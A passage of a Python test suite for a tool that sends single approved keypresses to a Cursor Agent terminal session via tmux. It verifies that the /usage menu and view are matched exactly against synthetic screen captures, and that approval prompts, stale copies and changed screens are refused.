            # (a) a disabled copy, then the live enabled row and the draft: an Enter would turn it OFF
            "a: disabled copy, live enabled row": [head, selected, enabled, draft, model, path],
            "a: disabled copy and draft copy, live enabled row": [head, selected, draft, enabled, draft, model, path],
            # (b) copied rows, then a live row and draft of another command
            "b: live /clear": [head, selected, draft, "\u2192 /clear    Clear the conversation", "\u2192 /clear", model, path],
            # (c) copied rows, then a live argument draft
            "c: live off argument": [head, selected, draft, "\u2192 /run-everything off", model, path],
            # (d) copied rows, then live free text: an Enter would send a chat message
            "d: live free text": [head, selected, draft, "\u2192 please summarise the review", model, path],
            # (e) copied rows with no live composer under them (agent busy)
            "e: busy agent, no composer": [head, selected, draft, "  Running tests...", "  ok  pkg/a", "  ok  pkg/b", "  ok  pkg/c"],
            "e: busy agent, status rows only": [head, selected, draft, "  Running tests...", "  ok  pkg/a", "  ok  pkg/b", path],
            "e: rows then nothing": [head, selected, draft],
            # a live row of another command or an argument draft, with only the status row under it
            "d: free text then only the status row": [head, selected, draft, "\u2192 please summarise the review", path],
            "c: off argument then only the status row": [head, selected, draft, "\u2192 /run-everything off", path],
            "b: other command then only the status row": [head, selected, draft, "\u2192 /clear", path],
        }
        for label, rows in cases.items():
            with self.subTest(label=label):
                self.refused_screen(rows, label)

    def test_the_selected_row_or_the_draft_anywhere_else_on_screen_refuses(self):
        head, selected, draft, model, path = RUN_ROWS
        cases = {
            "selected row twice": [head, selected, "  more output", selected, draft, model, path],
            "draft twice": [head, draft, "  more output", selected, draft, model, path],
            "rows apart": [head, selected, "  some other row", draft, model, path],
        }
        for label, rows in cases.items():
            with self.subTest(label=label):
                self.refused_screen(rows, label)

    def test_the_draft_must_sit_in_the_composers_own_tail(self):
        head, selected, draft, model, path = RUN_ROWS
        cases = {
            "no workspace status row last": [head, selected, draft, model, "  Add a follow-up"],
            "three tail rows": [head, selected, draft, "  hint", model, path],
            "text on the pane's last row": [head, selected, draft, model, path, "  trailing output"],
        }
        for label, rows in cases.items():
            with self.subTest(label=label):
                self.refused_screen(rows, label)

    def test_the_pane_last_row_must_be_blank(self):
        # The real pane parks its cursor on a blank last row under the status rows. Here the status row is the last row.
        capture = "\n".join(RUN_ROWS) + "\n"
        self.capture.write_text(capture)
        for typed in (".echo", ".stale"):
            Path(str(self.capture) + typed).unlink(missing_ok=True)
        height = len(capture.splitlines())
        self.env["FAKE_HEIGHT"] = str(height)
        self.env["FAKE_CURSOR_Y"] = str(height - 1)
        self.env["FAKE_HISTORY"] = "0"
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
        self.assertEqual(self.sends(), [])

    def test_the_cursor_must_sit_on_the_last_row(self):
        self.refused_screen(RUN_ROWS, "cursor above the last row", cursor=1)

    def test_only_the_exact_two_line_block_is_accepted(self):
        inspected = self.start_and_inspect()
        receipt = inspected["receipt"]
        selected, draft = RUN_ROWS[1], RUN_ROWS[2]
        cases = {
            "one line": selected + "\n",
            "three lines": selected + "\n" + draft + "\n" + RUN_ROWS[3] + "\n",
            "a line before": "\u2192 /run-everything\n" + selected + "\n" + draft + "\n",
            "reversed": draft + "\n" + selected + "\n",
            "draft with trailing text": selected + "\n\u2192 /run-everything now\n",
            "draft with another arrow": selected + "\n> /run-everything\n",
            "enabled row": selected.replace("disabled", "enabled") + "\n" + draft + "\n",
        }
        for label, text in cases.items():
            with self.subTest(label=label):
                path = self.root / ("exact-" + label.replace(" ", "-"))
                path.write_text(text)
                self.log.write_text("")
                code, refused = self.invoke("menu-key", self.args(receipt, expect=path))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])


# The live inline /usage menu, from a real 80x24 capture of the pinned client (2026.10.14-0f9edde): the draft FIRST, two
# blank rows (the input box's own), the menu BELOW it with the selected row marked by the arrow, and no status footer
# while the menu is open. The layout rows are verbatim; the answered trust box in history keeps its shape with an example
# path, and the transcript text is replaced by synthetic lines of the same shape. 55 rows = 31 history + the 24 visible.
LIVE_USAGE_CAPTURE_ROWS = [
    "",
    "  ╭──────────────────────────────────────────────────────────────────────────╮",
    "  │                                                                          │",
    "  │  ⚠ Workspace Trust Required                                              │",
    "  │                                                                          │",
    "  │  Cursor Agent can execute code and access files in this directory.       │",
    "  │                                                                          │",
    "  │  Do you trust the contents of this directory?                            │",
    "  │                                                                          │",
    "  │    /home/dev/work/example-task                                           │",
    "  │                                                                          │",
    "  │                                                                          │",
    "  │    [a] Trust this workspace                                              │",
    "  │    [q] Quit                                                              │",
    "  │                                                                          │",
    "  │  ⏳ Trusting workspace...                                                │",
    "  │                                                                          │",
    "  ╰──────────────────────────────────────────────────────────────────────────╯",
    "",
    "",
    "  Cursor Agent",
    "  v2026.10.14-0f9edde",
    "  Tip: Use /run-everything to skip all approvals.",
    "",
    "",
    "  Synthetic review text, line 01.",
    "  Synthetic review text, line 02.",
    "  Synthetic review text, line 03.",
    "  Synthetic review text, line 04.",
    "  Synthetic review text, line 05.",
    "  Synthetic review text, line 06.",
    "  Synthetic review text, line 07.",
    "  Synthetic review text, line 08.",
    "  Synthetic review text, line 09.",
    "  Synthetic review text, line 10.",
    "  Synthetic review text, line 11.",
    "  Synthetic review text, line 12.",
    "",
    "",
    "  Synthetic review text, line 13.",
    "  Synthetic review text, line 14.",
    "  Synthetic review text, line 15.",
    "  Synthetic review text, line 16.",
    "  Synthetic review text, line 17.",
    "",
    "",
    "",
    "",
    "  → /usage",
    "",
    "",
    "   → /usage                    Show plan and on-demand usage",
    "     /context                  Show context usage breakdown",
    "     /create-subagent          Create custom subagents for specialized AI…",
    "",
]
LIVE_HEIGHT = 24
USAGE_DRAFT = "\u2192 /usage"
USAGE_SELECTED = "\u2192 /usage                    Show plan and on-demand usage"
USAGE_EXPECT = USAGE_DRAFT + "\n" + USAGE_SELECTED + "\n"
USAGE_VIEW_ROWS = ["Cursor Agent v2026.10.14-0f9edde", "", "Usage", "  Included  42% used", "", "View in dashboard: example.test/usage",
                   "Esc to close"]
USAGE_VIEW_EXPECT = "Usage\n  Included  42% used\nView in dashboard: example.test/usage\nEsc to close\n"
COMPOSER_BACK_ROWS = ["Cursor Agent v2026.10.14-0f9edde", "", "", "", "\u2192 Add a follow-up", "  ~/work/example-task", ""]

# The plan view of the pinned Cursor client (2026.10.14, usage-pager): title row (plan, reset label), subtitle, table header,
# Included/Auto/API/On-Demand rows, detail line, dashboard row, footer. Synthetic figures, real strings. A narrow terminal
# (content width under 58) puts the reset label on its own row.
REAL_VIEW_WIDE = [
    "Usage \u00b7 Pro+                          Resets Nov 15",
    "Monthly plan and on-demand usage",
    "",
    "Category   Current       Usage",
    "Included   42% used      \u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591",
    "  Auto     30% used      \u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591",
    "  API      12% used      \u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591",
    "On-Demand  $0 / $20      \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591",
    "",
    "$20 remaining",
    "",
    "View in dashboard: example.test/dashboard?tab=usage",
    "Esc to close",
]
REAL_VIEW_NARROW = [REAL_VIEW_WIDE[0].split("  ")[0], "Resets Nov 15"] + REAL_VIEW_WIDE[1:]
# A pane under 49 columns wraps the dashboard URL (the URL column is narrower than the URL): 12 nonblank rows.
REAL_VIEW_WRAPPED = REAL_VIEW_NARROW[:-2] + ["View in dashboard: example.test/dash", "                   board?tab=usage", "Esc to close"]
# A pane under 40 columns drops the table header (Label: value rows), wraps the subtitle and the URL to three rows: 13 rows.
REAL_VIEW_COMPACT = [
    "Usage \u00b7 Pro+", "Resets Nov 15", "Monthly plan and on-demand", "usage", "",
    "Included: 42% used", "Auto: 30% used", "API: 12% used", "On-Demand: $0 / $20", "", "$20 remaining", "",
    "View in dashboard: exampl", "                   e.test/dash", "                   board?tab=usage", "Esc to close",
]


class UsageKeyTests(AnswerFixture):
    """menu-key: Enter on the live /usage row, and one checked Escape that closes the usage view."""

    show = MenuKeyTests.show
    sends = MenuKeyTests.sends
    state = MenuKeyTests.state
    restart_case = MenuKeyTests.restart_case
    menu_ledger = MenuKeyTests.menu_ledger
    history_show = MenuKeyTests.history_show

    def setUp(self):
        super().setUp()
        self.usage_expect = self.root / "expect-usage"
        self.usage_expect.write_text(USAGE_EXPECT)
        self.view_expect = self.root / "expect-view"
        self.view_expect.write_text(USAGE_VIEW_EXPECT)
        self.back = self.root / "composer-back"
        self.back.write_text("\n".join(COMPOSER_BACK_ROWS) + "\n\n")
        self.live_show(LIVE_USAGE_CAPTURE_ROWS)

    def live_show(self, rows, cursor=None):
        """Show a full capture (history + the last LIVE_HEIGHT visible rows) the way tmux reports it."""
        self.capture.write_text("\n".join(rows) + "\n")  # tmux ends its output with a newline
        for typed in (".echo", ".stale"):
            Path(str(self.capture) + typed).unlink(missing_ok=True)
        draft = [i for i, row in enumerate(rows[-LIVE_HEIGHT:]) if row.strip() == USAGE_DRAFT]
        self.env["FAKE_HEIGHT"] = str(LIVE_HEIGHT)
        self.env["FAKE_HISTORY"] = str(len(rows) - LIVE_HEIGHT)
        self.env["FAKE_CURSOR_Y"] = str(cursor if cursor is not None else (draft[0] if draft else LIVE_HEIGHT - 1))

    def live_visible(self, rows):
        """The live capture with its last LIVE_HEIGHT rows replaced (same geometry, same history)."""
        assert len(rows) == LIVE_HEIGHT, len(rows)
        return LIVE_USAGE_CAPTURE_ROWS[:-LIVE_HEIGHT] + rows

    def args(self, receipt, kind="usage-menu", approval=MENU_APPROVAL, expect=None):
        default = self.view_expect if kind == "usage-view" else self.usage_expect
        return ["--receipt", receipt, "--approval-ref", approval, "--expect-kind", kind,
                "--expect-text-file", str(expect or default)]

    def view(self, rows=USAGE_VIEW_ROWS, back=True):
        self.show(rows)
        if back:
            self.env["FAKE_ON_ESCAPE"] = str(self.back)
        else:
            self.env.pop("FAKE_ON_ESCAPE", None)

    def spend_then(self, receipt, kind, expect, capture):
        args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=receipt, approval_ref=MENU_APPROVAL,
                                  expect_kind=kind, expect_text_file=str(expect))
        original = helper.spend_approval

        def spend_then_change(path, entry):
            original(path, entry)
            self.capture.write_text(capture)

        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "spend_approval", spend_then_change):
            with self.assertRaises(helper.Refusal) as caught:
                helper.menu_key_session(args)
        self.assertEqual((caught.exception.state, caught.exception.code), ("screen-changed", 2))
        self.assertEqual(self.sends(), [])
        self.assertEqual(json.loads(self.menu_ledger().read_text())["outcome"], "not-sent")

    def real_expect(self, body):
        path = self.root / "expect-real-view"
        path.write_text("\n".join(row for row in body if row) + "\n")
        return path

    def real_screen(self, body, above=()):
        rows = ["Cursor Agent v2026.10.14-0f9edde", "", *above, *body]
        self.show(rows)
        composer = ["Cursor Agent v2026.10.14-0f9edde"] + [""] * (len(rows) - 3) + ["\u2192 Add a follow-up", "  ~/work/example-task"]
        self.back.write_text("\n".join(composer[:len(rows) - 1] + [""]) + "\n\n")
        self.env["FAKE_ON_ESCAPE"] = str(self.back)

    def test_the_real_plan_view_layouts_get_one_escape(self):
        layouts = (("wide", REAL_VIEW_WIDE, 10), ("narrow", REAL_VIEW_NARROW, 11), ("wrapped URL", REAL_VIEW_WRAPPED, 12),
                   ("compact", REAL_VIEW_COMPACT, 13))
        for label, body, rows_expected in layouts:
            with self.subTest(label=label):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.assertEqual(len([row for row in body if row.strip()]), rows_expected)
                self.real_screen(body)
                inspected = self.start_and_inspect()
                code, sent = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view", expect=self.real_expect(body)))
                self.assertEqual((code, sent["state"], sent["postcheck"]), (0, "key-sent", "composer-restored"))
                self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Escape"]])

    def test_a_wrapped_layout_with_a_row_missing_or_extra_is_refused(self):
        for label, body, screen in (
                ("wrapped, url tail missing", REAL_VIEW_WRAPPED, [r for r in REAL_VIEW_WRAPPED if "board?tab" not in r]),
                ("compact, subtitle tail missing", REAL_VIEW_COMPACT, [r for r in REAL_VIEW_COMPACT if r != "usage"]),
                ("compact, extra row before the footer", REAL_VIEW_COMPACT, REAL_VIEW_COMPACT[:-1] + ["stray", "Esc to close"])):
            with self.subTest(label=label):
                self.restart_case()
                self.real_screen(screen)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view", expect=self.real_expect(body)))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])

    def test_the_real_plan_view_layout_keeps_the_refusals(self):
        body = REAL_VIEW_WIDE
        without = lambda needle: [row for row in body if needle not in row]
        cases = {
            "loading row": [row.replace("42% used", "Loading usage data...") if "Included" in row else row for row in body],
            "error row": [row.replace("$20 remaining", "Failed to load usage data") for row in body],
            "no dashboard row": without("View in dashboard"),
            "no footer": without("Esc to close"),
            "a row of the block missing": without("  API "),
            "a composer row under the view": body[:-1] + ["\u2192 Add a follow-up", body[-1]],
        }
        for label, screen in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.real_screen(screen)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view", expect=self.real_expect(body)))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])
        with self.subTest(label="another view with the usage rows copied above it"):
            self.restart_case()
            self.real_screen(body[:-3] + ["Other view", "Esc to close"], above=body)
            inspected = self.start_and_inspect()
            code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view", expect=self.real_expect(body)))
            self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
            self.assertEqual(self.sends(), [])

    def refused_menu(self, rows, label, state="screen-mismatch", cursor=None):
        self.restart_case()
        self.log.write_text("")
        for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
            path.unlink()
        self.live_show(rows, cursor)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, state), label)
        self.assertEqual(self.sends(), [], label)
        self.assertFalse(self.menu_ledger().exists(), label)

    def test_the_real_capture_is_the_fixture(self):
        # The layout rows are the live capture's, byte for byte: draft, two blank rows, then the menu.
        visible = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        self.assertEqual(len(LIVE_USAGE_CAPTURE_ROWS), 55)
        self.assertEqual(visible[17:], ["  \u2192 /usage", "", "", "   \u2192 /usage                    Show plan and on-demand usage",
                                        "     /context                  Show context usage breakdown",
                                        "     /create-subagent          Create custom subagents for specialized AI\u2026", ""])

    def test_usage_menu_on_the_real_layout_sends_exactly_one_enter(self):
        inspected = self.start_and_inspect()
        self.assertNotIn(inspected["classification"], {"modal-trust", "modal-permission", "modal-approval", "modal-unknown"})
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, sent["state"], sent["key"]), (0, "key-sent", "Enter"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Enter"]])
        self.assertEqual(json.loads(self.menu_ledger().read_text())["kind"], "usage-menu")
        code, again = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, again["state"]), (2, "approval-spent"))
        self.assertEqual(len(self.sends()), 1)

    def test_the_gate_does_not_depend_on_where_the_cursor_is(self):
        for cursor in (0, 17, 23):
            with self.subTest(cursor=cursor):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.log.write_text("")
                self.live_show(LIVE_USAGE_CAPTURE_ROWS, cursor)
                inspected = self.start_and_inspect()
                code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
                self.assertEqual((code, sent["state"]), (0, "key-sent"))

    def test_usage_menu_refusals_send_nothing(self):
        v = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        head, menu_at = v[:17], 17
        selected, context, subagent = v[20], v[21], v[22]
        marked_context = "   \u2192 /context                  Show context usage breakdown"
        unmarked_usage = "     /usage                    Show plan and on-demand usage"
        cases = {
            "wrong row selected": head + [v[17], "", "", unmarked_usage, marked_context, subagent, ""],
            "another command's menu": head + [v[17], "", "", "   \u2192 /model                    Switch model", context, subagent, ""],
            "run-everything menu": head + ["  \u2192 /run-everything", "", "",
                                           "   \u2192 /run-everything         Toggle Run Everything (currently disabled)", context, subagent, ""],
            "argument draft": head + ["  \u2192 /usage now", "", "", selected, context, subagent, ""],
            "draft with no menu": head + [v[17], "", "", "", "", "", ""],
            "menu above the draft": head[:13] + [selected, context, subagent, "", "", v[17], "", "", "", "", ""],
            "no blank row between": head + [v[17], selected, context, subagent, "", "", ""],
            "four blank rows between": head[:16] + [v[17], "", "", "", "", selected, context, subagent],
            # Each of the next two ends on a blank last pane row, so only its own check can refuse it.
            "four blank rows between, blank last row": head[2:] + [v[17], "", "", "", "", selected, context, subagent, ""],
            "output below the menu after a blank row, blank last row": head[1:] + [v[17], "", "", selected, context, "", "  stray output", ""],
            # The selected row copied above the draft, and a block of only unmarked rows: the row is not IN the menu.
            "selected row only as a copy above the draft": v[:16] + [selected] + [v[17], "", "", unmarked_usage, "     /context                  Show context usage breakdown", subagent, ""],
            "two marked rows": head + [v[17], "", "", selected, "   \u2192 /context                  Show context usage breakdown", subagent, ""],
            "selected row twice": head + [v[17], "", "", selected, selected, subagent, ""],
            "draft twice": head[:16] + ["  \u2192 /usage"] + [v[17], "", "", selected, context, ""] + [""],
            "output under the menu after a blank row": head + [v[17], "", "", selected, context, "", "  trailing output"],
            "menu block of eleven rows": head[:9] + [v[17], "", ""] + [selected] + ["     /row%d" % i for i in range(10)] + [""],
            "status row directly under the menu": head + [v[17], "", "", selected, context, "  ~/work/example-task", ""],
            "model row directly under the menu": head + [v[17], "", "", selected, context, "  Grok 4.7 256K Extra High \u00b7 7.3%", ""],
            "output row inside the menu": head + [v[17], "", "", selected, "  Done.", subagent, ""],
            "more-above row not first": head + [v[17], "", "", selected, "\u2191 more above", subagent, ""],
            "more-below row not last": head + [v[17], "", "", selected, "\u2193 more below", subagent, ""],
            "a marked scroll look-alike": head + [v[17], "", "", selected, "\u2193 more below now", subagent, ""],
            "status footer under the menu": head + [v[17], "", "", selected, "", "  Grok 4.7 256K Extra High \u00b7 7.3%", "  ~/work/example-task"],
            "menu on the last pane row": ["  earlier output"] + head + [v[17], "", "", selected, context, subagent],
            "loading text instead of the menu": head + [v[17], "", "", "Loading usage data...", "", "", ""],
            "plain composer": head + ["", "", "\u2192 Add a follow-up", "  ~/work/example-task", "", "", ""],
        }
        for label, visible in cases.items():
            with self.subTest(label=label):
                self.refused_menu(self.live_visible(visible), label)

    def test_a_scrolled_menu_with_more_above_and_below_rows_still_passes(self):
        v = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        menu = [v[20], v[21], "     /create-subagent          Create custom subagents for specialized AI\u2026"]
        for label, block in (("both", ["\u2191 more above"] + menu + ["\u2193 more below"]), ("above", ["\u2191 more above"] + menu),
                             ("below", menu + ["\u2193 more below"])):
            with self.subTest(label=label):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.log.write_text("")
                rows = v[:17][len(block) - 3:] + [v[17], "", ""] + block + [""]
                self.assertEqual(len(rows), LIVE_HEIGHT)
                self.live_show(self.live_visible(rows))
                inspected = self.start_and_inspect()
                code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
                self.assertEqual((code, sent["state"]), (0, "key-sent"))

    def test_a_copy_in_the_transcript_or_in_history_is_not_the_live_menu(self):
        v = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        composer = v[:17] + ["", "", "", "\u2192 Add a follow-up", "  ~/work/example-task", "", ""]
        # the draft and menu only in the scrolled history, a plain composer on the visible screen
        history = LIVE_USAGE_CAPTURE_ROWS[:20] + v[17:] + LIVE_USAGE_CAPTURE_ROWS[27:31]
        self.refused_menu(history[:31] + composer, "copy in history")
        # an old visible copy above a later plain composer
        old = v[:5] + v[17:23] + ["  Review: no findings."] + composer[12:] 
        self.refused_menu(self.live_visible(old[:LIVE_HEIGHT] + [""] * (LIVE_HEIGHT - len(old[:LIVE_HEIGHT]))), "old visible copy")
        # a copy of the draft in the transcript while the live menu is open
        copy = ["  \u2192 /usage"] + v[1:]
        self.refused_menu(self.live_visible(copy), "draft copy above the live menu")

    def test_a_prompt_on_screen_is_never_answered_with_a_key(self):
        v = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        visible = v[:-4] + ["  Allow this command: git push", "  (y) Run once", "", ""]
        self.refused_menu(self.live_visible(visible), "prompt over the menu", state="modal-approval")

    def test_a_prompt_or_change_after_the_approval_is_spent_gets_no_key(self):
        v = LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:]
        changes = {
            "a prompt appeared": v[:-4] + ["  Allow this command: git push", "  (y) Run once", "", ""],
            "the menu row was replaced": v[:20] + ["   \u2192 /usage-credits           Configure"] + v[21:],
            "the menu closed": v[:17] + [""] * 7,
        }
        for label, visible in changes.items():
            with self.subTest(label=label):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.live_show(LIVE_USAGE_CAPTURE_ROWS)
                inspected = self.start_and_inspect()
                args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=inspected["receipt"],
                                          approval_ref=MENU_APPROVAL, expect_kind="usage-menu", expect_text_file=str(self.usage_expect))
                original = helper.spend_approval

                def spend_then_change(path, entry):
                    original(path, entry)
                    self.capture.write_text("\n".join(self.live_visible(visible)) + "\n")

                with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "spend_approval", spend_then_change):
                    with self.assertRaises(helper.Refusal) as caught:
                        helper.menu_key_session(args)
                self.assertEqual((caught.exception.state, caught.exception.code), ("screen-changed", 2))
                self.assertEqual(self.sends(), [])
                self.assertEqual(json.loads(self.menu_ledger().read_text())["outcome"], "not-sent")

    def test_usage_view_escape_sends_one_escape_and_checks_the_composer(self):
        self.view()
        inspected = self.start_and_inspect()
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
        self.assertEqual((code, sent["state"], sent["key"], sent["postcheck"]), (0, "key-sent", "Escape", "composer-restored"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Escape"]])
        self.assertEqual(json.loads(self.menu_ledger().read_text())["postcheck"], "composer-restored")

    def test_escape_without_the_composer_back_is_reported_unconfirmed(self):
        self.view(back=False)
        inspected = self.start_and_inspect()
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
        self.assertEqual((code, refused["state"]), (3, "post-check-unconfirmed"))
        self.assertEqual(len(self.sends()), 1)
        self.assertEqual(json.loads(self.menu_ledger().read_text())["postcheck"], "composer-not-confirmed")
        code, again = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
        self.assertEqual((code, again["state"]), (2, "approval-spent"))
        self.assertEqual(len(self.sends()), 1)

    def test_other_empty_composer_forms_are_a_good_escape_and_free_text_is_not(self):
        forms = {
            "plan placeholder": ("\u2192 Add a follow-up \u2014 /plan to review and build", "composer-restored"),
            "first prompt": ("\u2192 Plan, search, build anything", "composer-restored"),
            "busy hint": ("\u2192 Add a follow-up  ctrl+c to stop", "composer-restored"),
            "busy hint on the first prompt": ("\u2192 Plan, search, build anything  ctrl+c to stop", "composer-restored"),
            "typed text": ("\u2192 Add a follow-up now", None),
            "other text with the hint": ("\u2192 do something  ctrl+c to stop", None),
            "wrong dash text": ("\u2192 Add a follow-up \u2014 /plan to delete everything", None),
        }
        for label, (row, expected) in forms.items():
            with self.subTest(label=label):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.view()
                back = COMPOSER_BACK_ROWS[:4] + [row] + COMPOSER_BACK_ROWS[5:]
                self.back.write_text("\n".join(back) + "\n\n")
                inspected = self.start_and_inspect()
                code, out = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
                if expected:
                    self.assertEqual((code, out["postcheck"]), (0, expected))
                else:
                    self.assertEqual((code, out["state"]), (3, "post-check-unconfirmed"))
                self.assertEqual(len(self.sends()), 1)

    def post_escape_run(self, fault):
        """Run the Escape in process; `fault(kind, calls_since_send)` may raise inside the helper's reads."""
        self.view()
        inspected = self.start_and_inspect()
        args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=inspected["receipt"],
                                  approval_ref=MENU_APPROVAL, expect_kind="usage-view", expect_text_file=str(self.view_expect))
        reads = {"identity": 0, "capture": 0}
        real_identity, real_capture = helper.read_identity, helper.read_capture_rows

        def identity(*a, **k):
            if self.sends():
                reads["identity"] += 1
                fault("identity", reads)
            return real_identity(*a, **k)

        def capture(*a, **k):
            if self.sends():
                reads["capture"] += 1
                fault("capture", reads)
            return real_capture(*a, **k)

        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "read_identity", identity), \
                mock.patch.object(helper, "read_capture_rows", capture):
            try:
                return helper.menu_key_session(args), reads
            except helper.Refusal as refusal:
                return refusal, reads

    def test_a_transient_unclear_look_after_the_escape_is_looked_at_again(self):
        def fault(kind, reads):
            if kind == "capture" and reads["capture"] <= 2:
                raise helper.Refusal("prompt-unclear", "redraw")
        result, reads = self.post_escape_run(fault)
        self.assertEqual(result["postcheck"], "composer-restored")
        self.assertEqual((reads["capture"], len(self.sends())), (3, 1))

    def test_an_identity_failure_after_the_escape_stops_at_once(self):
        def fault(kind, reads):
            if kind == "identity":
                raise helper.Refusal("pane-changed", "pid changed")
        result, reads = self.post_escape_run(fault)
        self.assertEqual((result.state, result.code), ("post-check-unconfirmed", 3))
        self.assertEqual((reads["identity"], reads["capture"], len(self.sends())), (1, 0, 1))

    def test_unlocatable_looks_stop_after_the_five_looks_and_a_prompt_stops_at_once(self):
        def always(kind, reads):
            if kind == "capture":
                raise helper.Refusal("prompt-unclear", "redraw")
        result, reads = self.post_escape_run(always)
        self.assertEqual((result.state, reads["capture"], len(self.sends())), ("post-check-unconfirmed", 5, 1))
        self.restart_case()
        for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
            path.unlink()
        self.back.write_text("\n".join(USAGE_VIEW_ROWS[:-3] + ["  Allow this command: git push", "  (y) Run once"] + [""]) + "\n\n")
        result, reads = self.post_escape_run(lambda kind, reads: None)
        self.assertEqual((result.state, reads["capture"], len(self.sends())), ("post-check-unconfirmed", 1, 1))

    def test_escape_that_leaves_the_footer_beside_a_composer_is_unconfirmed(self):
        self.view()
        self.back.write_text("\n".join(USAGE_VIEW_ROWS[:-2] + ["\u2192 Add a follow-up", "Esc to close"]) + "\n\n")
        inspected = self.start_and_inspect()
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
        self.assertEqual((code, refused["state"]), (3, "post-check-unconfirmed"))

    def test_a_view_that_is_not_shown_gets_no_escape(self):
        cases = {
            "loading": ["Cursor Agent v2026.10.14-0f9edde", "", "Usage", "Loading usage data...", "", "", "Esc to close"],
            "error": ["Cursor Agent v2026.10.14-0f9edde", "", "Usage", "Failed to load usage data", "", "", "Esc to close"],
            "no footer": USAGE_VIEW_ROWS[:-1] + [""],
            "composer under the view": USAGE_VIEW_ROWS[:-2] + ["\u2192 Add a follow-up", "Esc to close"],
            "plain composer": COMPOSER_BACK_ROWS,
            "the slash menu": LIVE_USAGE_CAPTURE_ROWS[-LIVE_HEIGHT:],
            "duplicate title": USAGE_VIEW_ROWS[:3] + ["Usage"] + USAGE_VIEW_ROWS[3:],
            "another view with copied usage rows above": USAGE_VIEW_ROWS[:2] + [
                "Usage", "  Included  42% used", "View in dashboard: example.test/usage", "", "Other view", "Esc to close"],
            "a stale draft row above the view": ["\u2192 old draft"] + USAGE_VIEW_ROWS[1:],
            "a loading row above the view": ["Loading usage data..."] + USAGE_VIEW_ROWS[1:],
            "footer not last": USAGE_VIEW_ROWS + ["  Stray row"],
            "view only in history": None,
        }
        for label, rows in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.env["FAKE_ON_ESCAPE"] = str(self.back)
                if rows is None:
                    self.history_show(USAGE_VIEW_ROWS * 2, COMPOSER_BACK_ROWS)
                else:
                    self.show(rows)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.menu_ledger().exists())

    def test_a_prompt_over_the_view_gets_no_escape(self):
        self.view()
        self.show(USAGE_VIEW_ROWS + ["  Allow this command: git push", "  (y) Run once"])
        inspected = self.start_and_inspect()
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="usage-view"))
        self.assertEqual(code, 2)
        self.assertTrue(refused["state"].startswith("modal-"))
        self.assertEqual(self.sends(), [])

    def test_a_view_that_changes_after_the_approval_is_spent_gets_no_escape(self):
        self.view()
        inspected = self.start_and_inspect()
        loading = ["Cursor Agent v2026.10.14-0f9edde", "", "Usage", "Loading usage data...", "", "", "Esc to close"]
        self.spend_then(inspected["receipt"], "usage-view", self.view_expect, "\n".join(loading) + "\n\n")

    def test_the_expected_text_is_checked_before_any_tmux_call(self):
        bad = {
